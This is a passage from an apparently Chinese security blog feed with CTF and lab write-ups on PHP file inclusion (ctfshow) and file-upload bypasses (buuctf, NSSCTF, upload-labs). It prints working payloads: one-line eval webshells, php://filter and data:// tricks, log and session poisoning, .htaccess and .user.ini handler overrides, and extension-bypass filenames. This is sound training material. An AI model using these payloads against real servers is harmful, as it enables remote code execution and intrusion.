title="web80"></a>web80</h3><p>php和data都被替换了</p><p>1.php:&#x2F;&#x2F;input伪协议（大小写绕过）</p><pre><code>?file=Php://input再post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></pre><p>2.日志文件包含，伪造UA写入php代码</p><p>日志文件记录了服务器收到的每一次请求的</p><p>IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</p><p>nginx日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>先写入日志：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/201035.png" class=""><p>再包含日志，执行代码：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class=""><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>这道题过滤了冒号，所以远程文件包含和大小写绕过不行了，只能用日志包含，同上题</p><h3 id="web82-session文件包含"><a href="#web82-session文件包含" class="headerlink" title="web82-session文件包含"></a>web82-session文件包含</h3><p>参考<a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">https://blog.csdn.net/qq_46918279/article/details/120106832</a></p><pre><code class="markdown">PHP里面唯一我们能控制的没有后缀的文件就是session文件利用PHP_SESSION_UPLOAD_PROGRESS写入session文件加条件竞争达到文件包含的目的1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on（默认开启）3. session.upload_progress.prefix = &quot;upload_progress_&quot;（默认）4. session.upload_progress.name = &quot;$PHP_SESSION_UPLOAD_PROGRESS&quot;（默认）enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控也就是PHP_SESSION_UPLOAD_PROGRESS的值可控；prefix+name将表示为session中的键名</code></pre><pre><code class="markdown">大体思路为：1、post一个与ini中设置的session.upload_progress.name的同名变量（默认的name为“PHP_SESSION_UPLOAD_PROGRESS”），那么就会返回上传文件的实时进度并写入session文件中。session文件的内容为:（它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值）2、如果我们post传递PHP_SESSION_UPLOAD_PROGRESS的值为一句话木马比如为：&lt;?php system(&#39;ls&#39;);?&gt;3、同时，我们在cookie里面设置名字：PHPSESSID，值：flag，（目的是设置session文件，因为这样我们才能知道实时进度（一句话木马）上传到哪里了）；那么在/tem/sess_flag这个文件的内容就为upload_progress_&lt;?php system(&#39;ls&#39;)?&gt;。然后在include（/tem/sess_flag）就会执行后面的php代码从而成功执行rce。4、虽然文件上传结束后，php会清空session文件中的内容，但是如果我们边上传边去访问/tem/sess_aaa进行条件竞争，那么就有可能在删除session文件前访问到这个文件。</code></pre><p>我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;aaa，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_aaa”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。</p><p>操作：1、先构造一个上传文件的页面，对环境上传一个任意的文件，内容也任意，然后抓包。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://dadcfcfb-217c-4393-817b-acf2a96574b7.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>2、 修改上传文件包</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/233813.png" class=""><p>注意两点：</p><p>（1）设置Cookie：PHPSEESSID&#x3D;flag、这样我们的session就为&#x2F;tmp&#x2F;sess_flag</p><p>（2）设置同名变量PHP_SESSION_UPLOAD_PROGRESS，设置值为我们想要存入session文件的代码。（把第一步中value&#x3D;123的改掉即可，这里对123加上§§是为了进行爆破payload用）<br>3、包含session文件，抓包</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/234110.png" class=""><p>这里§a§是为了方便爆破用</p><p>4、进行爆破</p><p>payload数量可以设置10000次，也可以使用无数次。</p><p>设置线程数（用了30）</p><p>然后一起爆破（先对上传文件包点击attack，在对&#x2F;tmp&#x2F;sess_flag文件包含包点击attack，也可以不管顺序，因为爆破次数有很多）</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/235457.png" class=""><p> 最后将ls改成tac fl0g.php就行 </p><h3 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h3><p><strong>session_unset();</strong><br>释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的sessionid<br><strong>session_destroy();</strong><br>删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留<br>所以这两个函数等同于将内存中的$_SESSION变量释放且删除了session文件和释放sessionid，我们是无法进行session文件包含的。但是：我们的脚本或者bp仍然能够进行包含。原因在于多线程竞争：</p><pre><code class="markdown">什么是多线程竞争线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。怎么解决多线程竞争问题?---锁锁的好处: 确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资 源竞争下的原子操作问题。锁的坏处: 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下 降了锁的致命问题: 死锁 </code></pre><h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3><p>system(“rm -rf &#x2F;tmp&#x2F;*”)会强制删除&#x2F;tmp&#x2F;下的所有文件</p><p>还是web82的方法，多线程竞争理解</p><h3 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h3><p>file_exists — 检查文件或目录是否存在,如果由指定的文件或目录存在则返回 true，否则返回 false。</p><p>file_get_contents — 将整个文件读入一个字符串,函数返回读取到的数据， 或者在失败时返回 false。</p><p>strpos — 查找字符串首次出现的位置,返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 false。</p><p>还是web82的方法、同样的道理：多线程竞争理解</p><h3 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h3><p>知识点：</p><pre><code class="markdown">define — 定义一个常量dirname：返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（&#39;.&#39;），表示当前目录。否则返回的是把 path 中结尾的/component（最后一个斜线以及后面部分）去掉之后的字符串。set_include_path — 设置include函数中 include_path 配置选项，成功时返回旧的 include_path或者在失败时返回 false。include被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；这一点和require 不同，后者会发出一个致命错误。如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix/Linux 下以 / 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path都会被完全忽略。例如一个文件以 ../ 开头，则解析器会在当前目录的父目录下寻找该文件。</code></pre><p>还是web82的方法、同样的道理：多线程竞争理解</p><p>因为设置了目录&#x2F;tmp&#x2F;sess_flag，所以set_include_path对我们的脚本没有用。</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><pre><code class="php">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $content = $_POST[&#39;content&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>参考<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p><p>​<a href="https://xz.aliyun.com/t/8163#toc-3">file_put_content和死亡·杂糅代码之缘</a></p><p>方法1：base64编码</p><p>这道题，向文件输入内容的时候会在开头写入死亡函数，从而导致直接结束代码的执行，我们要做的就是绕过这个死亡函数。</p><p>编码时，转换成Base64的最小单位就是3个字节</p><p>解码时，4个字节为一组；PHP在解码base64时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64的字符选用了”A-Z、a-z、0-9、+、&#x2F;“ 64个可打印字符）所以，通过base64解码过滤之后就只有 phpdie6  个字符我们就要添加2个字符让phpdie和我们增加的两个字符组合起来进行解码。即可抹掉死亡函数。</p><p>其次：因为filename那里需要urldecode，而get传参的时候会进行一次urldecode，所以我们的filename需要两次urlencode。?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php这里需要进行url全编码，不然php会被过滤掉。<br>将&lt;?php eval($_POST[1]);?&gt;进行base64编码为：PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+，注意如果直接传入content，这里的+会被当做空格处理，所以在base64解码的时候就会忽略空格，自动在后面加上一个&#x3D;：即PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8&#x3D;，解码后：&lt;?php eval($_POST[1]);?   这样传进去就会报错</p><p>解决方法：将+进行urlencode或直接去掉?&gt;</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class=""><p>方法2：rot13编码</p><p>条件：在PHP不开启short_open_tag（短标签）时</p><pre><code>payload:?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30//?file=php://filter/write=string.rot13/resource=3.php//对写的内容进行rot13编码。content=&lt;?cuc riny($_CBFG[1]);?&gt;//&lt;?php eval($_POST[1]);?&gt;//rot13两次解码后会变成原来的样子。所以我们将传入的content进行一次rot13编码，然后在写入3.php的时候在进行rot13编码，那么写入文件的时候就会写入&lt;?php eval($_POST[1]);?&gt;。//而&lt;?php die(&#39;大佬别秀了&#39;);?&gt;只会进行一次rot13编码，写入文件的时候就不是一个正常的php代码格式。</code></pre><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>这关过滤了很多，但有个data没有过滤</p><pre><code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8%2B //+号可以用%2b编码data://text/plain;base64,&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>misc,看起来比较麻烦，先放着</p><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌</a></p><p>这关没有过滤php，那么我们就可以通过php:&#x2F;&#x2F;filter&#x2F;write来写入文件，然后通过编码绕过死亡函数，因为这里过滤了base64和rot13，string，所以得用其他的编码。</p><pre><code>convert.iconv.这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换;;其用法：iconv ( string $in_charset , string $out_charset , string $str ) : string 将字符串 str 从 in_charset 转换编码到 out_charset。 就其功能而论，有点类似于base_convert的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；</code></pre><p><strong>usc-2</strong>编码：这个是将前后两个字符进行交替(abcd&#x3D;&#x3D;&gt;badc)，所以写入文件的&lt;?php die();?&gt;就会被扰乱，从而绕过。</p><pre><code>get: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.phppost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?然后访问1.php post:1=system(&#39;tac f*&#39;);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传(混合)</title>
      <link href="/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/"/>
      <url>/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/</url>
      
        <content type="html"><![CDATA[<h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>通过测试发现这道题检测了文件后缀，文件类型和文件内容。</p><p>文件后缀我们用.phtml绕过，文件类型我们修改为Content-Type：image&#x2F;jpeg，文件内容它检测到了”&lt;?”,可以用&lt;script language&#x3D;”php”&gt;eval($_POST[shell])&lt;&#x2F;script&gt;绕过，还需要加上文件头GIF89a</p><img src="/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/210543.png" class=""><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>上来就是一个前端js验证，burp抓包修改后缀：</p><img src="/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/215809.png" class=""><p>发现response是nonono bad file，试试.phtml后缀</p><img src="/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/220018.png" class=""><p>成功</p><h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>这道题很迷，测了很多东西都过不去，甚至最后测一张普通的图片都过不去，最后才在源代码中发现对上传内容长度有限制：$_FILES[“uploaded”][“size”] &lt; 2048。</p><p>那么重新按常规思路走：</p><p>首先修改content-Type必须为image&#x2F;jpeg才可以，然后发现后缀名也不能含有ph，</p><img src="/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/225239.png" class=""><p>还是不行，修改一句话为&lt;script language&#x3D;”php”&gt;eval($_REQUEST[shell])&lt;&#x2F;script&gt;成功绕过。</p><p>既然只上传了一个jpg文件，那么还需要上传一个.htaccess</p><p>.htaccess的方法：</p><pre><code>方法一：只将“haha.png”文件当成php文件执行&lt;FilesMatch &quot;haha.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;方法二：这里时是要包含所有文件带有haha的文件（只要文件名里面有haha都可以），都会被当成php代码执行&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;方法三：这种方法时，后面的.png或者.jpg文件能被当成php代码执行，如果想换成别的改扩展名就可以AddType application/x-httpd-php .pngAddType application/x-httpd-php .jpg</code></pre><p>最后可以使用蚁剑连接</p><h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>测了一下发有黑名单过滤和MIME信息过滤，那就常规操作，上传个png木马，再传个.htaccess文件，将Content-Type修改为image&#x2F;png就行。</p><p>要注意的是，这题用不了system等函数了，但可以用show_source()。</p><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>打开后可以看到是一个文件上传的题目，我们先上传个一句话，测试过程中发现这道题限制了文件后缀，文件头，还过滤了&lt;?，</p><p>所以我们需要上传一个.png的图片马，内容如下：</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[shell])&lt;/script&gt;</code></pre><p>这道题测试了一下虽然可以成功上传.htaccess文件，但不能利用，可能是没有开启AllowOverride All，所以只能使用.user.ini文件（前提是含有.user.ini的文件夹下需要有正常的php文件）</p><pre><code>GIF89aauto_prepend_file=haha.png</code></pre><p>最后需要访问index.php</p><h2 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h2><h3 id="SWPUCTF-2021-新生赛-easyupload1-0"><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h3><p>这道题验证了MIME信息，只需要将Content-Type改为image&#x2F;png就行，但这题比较坑的是flag在环境变量里面，执行phpinfo()就能找到。</p><h3 id="SWPUCTF-2021-新生赛-easyupload2-0"><a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload2.0"></a>[SWPUCTF 2021 新生赛]easyupload2.0</h3><p>这题只过滤了php后缀，所以只需要上传.html就可以绕过</p><h3 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h3><p>这关过滤了.php后缀，但是可以用.html，但是利用不了，所以我传个.htaccess让其能够解析.html</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传(upload-labs)</title>
      <link href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"/>
      <url>/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/</url>
      
        <content type="html"><![CDATA[<h3 id="Pass01Javascript-前端检查"><a href="#Pass01Javascript-前端检查" class="headerlink" title="Pass01Javascript 前端检查"></a>Pass01Javascript 前端检查</h3><p>前端js限制，一般都是通过 JS 限制上传的文件类型，对于这种情况，我们可以采用以下几种方式绕过</p><p>1、禁用js</p><p>2、上传png后缀的webshell，代理抓包，修改上传的文件后缀 </p><p>​这里可能会遇到一个问题，burpsuite会抓不到包。这时我们只需把127.0.0.1改为本机IPv4的地址。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/154309.png" class=""><p>3、修改JS文件</p><p>右键—查看网站源代码—全部复制—创建一个记事本—将代码放进去—把记事本后缀名改为.html—用Notepad打开—找到js代码—删除</p><p>如果我们打开，是有上传文件的界面，但是不知道要上传给谁。这时我们返回到最开始，右键—检查—网络—然后上传一个正常的图片。这样我们就可以看到这个文件传给谁了。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/155607.png" class=""><p>然后我们在用Notepad打开我们自己的html文件，修改action,这个action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。最后用浏览器打开我们的html文件，上传。php文件即可。</p><h3 id="Pass02文件类型检查有缺陷"><a href="#Pass02文件类型检查有缺陷" class="headerlink" title="Pass02文件类型检查有缺陷"></a>Pass02文件类型检查有缺陷</h3><p>文件类型检查有缺陷（检查Content-Type标头是否与MIME 类型匹配）</p><p>上传php抓包，将Content-Type修改为允许上传的类型（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/164003.png" class=""><h3 id="Pass03黑名单限制不完全"><a href="#Pass03黑名单限制不完全" class="headerlink" title="Pass03黑名单限制不完全"></a>Pass03黑名单限制不完全</h3><p>对于黑名单限制上传文件后缀的 可以通过以下几种方式绕过</p><ol><li><p>通过使用可被执行但不常见的后缀名，比如 php5,shtml,phps,pht,phtml等等</p></li><li><p>上传恶意的配置文件（Apache .htaccess） 欺骗服务器将任意自定义文件扩展名映射到可知执行的MIME类型</p></li><li><p>利用后端解析差异绕过限制</p></li><li><ol><li>添加尾随字符，一些组件会去除或忽略尾随空格、点等：exploit.php. &#x2F;exploit.php+空格</li><li>对点，斜杠 使用URL 编码， 如果验证文件扩展名时没有解码，在服务端被解码，绕过黑名单限制， exploit%2Ephp</li><li>在文件扩展名前添加分号或 URL 编码的空字节字符。如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C&#x2F;C++ 中的低级函数处理文件，例如，这可能会导致文件名结尾出现差异：exploit.asp;.jpg或exploit.asp%00.jpg</li></ol></li></ol><p>这一关上传.php5即可,可以用蚁剑连接，我用的是php5.4.45</p><h3 id="Pass04-htaccess-扩展后缀名"><a href="#Pass04-htaccess-扩展后缀名" class="headerlink" title="Pass04 .htaccess 扩展后缀名"></a>Pass04 .htaccess 扩展后缀名</h3><p>这一关限制了很多后缀，尝试上传 .htaccess 配置文件，将haha.png图片当作php代码进行解析</p><p>注意：在httpd.conf文件中设置 AllowOverried All ，才能使用.htaccess文件</p><p>首先创建一个.htaccess文件，里面写上代码</p><p>&lt;FilesMatch “haha.png”&gt;<br>SetHandler application&#x2F;x-httpd-php</p><p>&lt;&#x2F;FilesMatch&gt;</p><p>或：</p><p>&lt;FilesMatch “haha”&gt;<br>SetHandler application&#x2F;x-httpd-php</p><p>&lt;&#x2F;FilesMatch&gt;</p><p>然后再上传图片马即可</p><h3 id="Pass05"><a href="#Pass05" class="headerlink" title="Pass05"></a>Pass05</h3><p><strong>解法一：</strong></p><p>这一关的思路是它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。所以我们的绕过思路就很简单，在数据包中把后缀名改为.php.  .说一下他的验证过程，首先他发现有一个点，这时会把他去掉，又发现有一个空格，也会把它去掉，我们这时还有一个点，也就是.php. 由于他只是验证一次，所以不会在去掉我们的点，这时就可以上传成功，也可以解析成功（系统会忽略最后一个点）。</p><p><strong>解法二：.user.ini</strong></p><p>首先上传.user.ini文件，文件内容为：<br> auto_prepend_file&#x3D;haha.png</p><p>user.ini文件里的意思是：所有的php文件都自动包含haha.png文件。.user.ini相当于一个用户自定义的php.ini</p><p>接着上传Pass05.png文件，文件内容为：<br> &lt;?php @eval($_POST[‘shell’]);?&gt;</p><p>最后需要访问的是readme.php</p><p>需要条件：</p><ul><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式（phpstudy切换版本，nts就是fastcgi模式）</li><li>上传目录下要有可执行的php文件</li></ul><p>.user.ini可以参考：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p><strong>解法三：</strong></p><p><strong>借助windows平台的正则匹配规则</strong></p><pre><code>如下符号在windows平台下等效果&quot; =&gt; .&gt; =&gt; ?&lt; =&gt; *</code></pre><p>首先随便上传一个xxx.php:.jpg，此时服务器会生成一个xxx.php的空文件，然后，修改数据包文件名为：<code>xxx.&lt;&lt;&lt;</code>，这里在move_uploaded_file($temp_file, ‘..&#x2F;..&#x2F;upload&#x2F;xxx.&lt;&lt;&lt;’)类似与正则匹配，匹配到…&#x2F;..&#x2F;upload&#x2F;xxx.php文件，然后会将此次上传的文件数据写入到xxx.php文件中，这样就成功写入我们的小马了</p><h3 id="Pass06大小写绕过"><a href="#Pass06大小写绕过" class="headerlink" title="Pass06大小写绕过"></a>Pass06大小写绕过</h3><p>服务器端检查后缀时忽略了对大小写的检测，故可以通过大小写混合后缀绕过</p><h3 id="Pass07黑名单限制不完全-空格"><a href="#Pass07黑名单限制不完全-空格" class="headerlink" title="Pass07黑名单限制不完全- 空格"></a>Pass07黑名单限制不完全- 空格</h3><p>这关没有首尾去空。上传php文件，抓包在后面加空格。</p><p>Windows下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点。</p><p>在Linux上面测试失败，Linux的机制很严格;在Windows上面测试成功！</p><h3 id="Pass08黑名单限制不完全-点"><a href="#Pass08黑名单限制不完全-点" class="headerlink" title="Pass08黑名单限制不完全 - 点"></a>Pass08黑名单限制不完全 - 点</h3><p>这一关黑名单，没有使用deldot()过滤文件名末尾的点，可以使用文件名后加.进行绕过</p><p>同样Linux测试失败。</p><h3 id="Pass09黑名单限制不完全-DATA"><a href="#Pass09黑名单限制不完全-DATA" class="headerlink" title="Pass09黑名单限制不完全 - ::$DATA"></a>Pass09黑名单限制不完全 - ::$DATA</h3><p>这一关黑名单，没有对::D A T A 进 行 处 理 ， 可 以 使 用 : : DATA进行处理，可以使用::DATA绕过黑名单(<strong>仅限windows</strong>)</p><p>上传PHP一句话文件，抓包改后缀haha.php::$DATA（注意访问的时候不要加上::$data）</p><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名 他的目的就是不检查后缀名。</p><h3 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h3><p>第10关好像和第五关重复了，可以用第五关的方法绕过</p><h3 id="Pass11黑名单限制不完全-双写绕过"><a href="#Pass11黑名单限制不完全-双写绕过" class="headerlink" title="Pass11黑名单限制不完全 - 双写绕过"></a>Pass11黑名单限制不完全 - 双写绕过</h3><p>源码中 使用 str_ireplace 不区分大小写替换，只是替换了一次，我们可以利用双写绕过检查</p><p>上传文件名 ：webshell.pphphp</p><h3 id="Pass12-00截断-GETurl路径可控"><a href="#Pass12-00截断-GETurl路径可控" class="headerlink" title="Pass12-%00截断(GETurl路径可控)"></a>Pass12-%00截断(GETurl路径可控)</h3><p>这一关白名单，最终文件的存放位置是以拼接的方式，可以使用%00截断，但需要php版本&lt;5.3.4，并且magic_quotes_gpc关闭。</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/223357.png" class=""><p>url中的%00（只要是这种%xx）的形式，webserver会把它当作十六进制处理，然后把16进制的hex自动翻译成ascii码值“NULL”,实现了截断</p><h3 id="Pass13-00截断-POST路径可控"><a href="#Pass13-00截断-POST路径可控" class="headerlink" title="Pass13-00截断(POST路径可控)"></a>Pass13-00截断(POST路径可控)</h3><p>和12关区别就在于GET和POST,GET是可以把url自动解码的，但是POST不会</p><p>这里先写一个haha.php(空格)a，写空格是为了便于修改hex</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/225738.png" class=""><p>因为post不会像get对%00进行自动解码，所以需要将%00修改为hex 00</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/225950.png" class=""><h3 id="Pass14文件内容检测"><a href="#Pass14文件内容检测" class="headerlink" title="Pass14文件内容检测"></a>Pass14文件内容检测</h3><p>这一关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件</p><p>使用 图片马 + 文件包含 绕过</p><p><strong>制作图片马上传</strong></p><pre><code>Linux下：cat 1.png 1.php &gt; 2.pngWindows下：copy 1.png /b + 1.php /a 2.png</code></pre><pre><code>补充知识：1.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。2.Jpg图片文件包括2字节：FF D8。3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。4.Bmp图片文件包括2字节：42 4D。即为 BM。</code></pre><p>我们这里直接可以在图片马开头加上GIF89a</p><p>上传图片马后点击‘文件包含漏洞’链接，然后在url里加上?file&#x3D;upload&#x2F;xxxxxxxx.gif即可</p><h3 id="Pass15"><a href="#Pass15" class="headerlink" 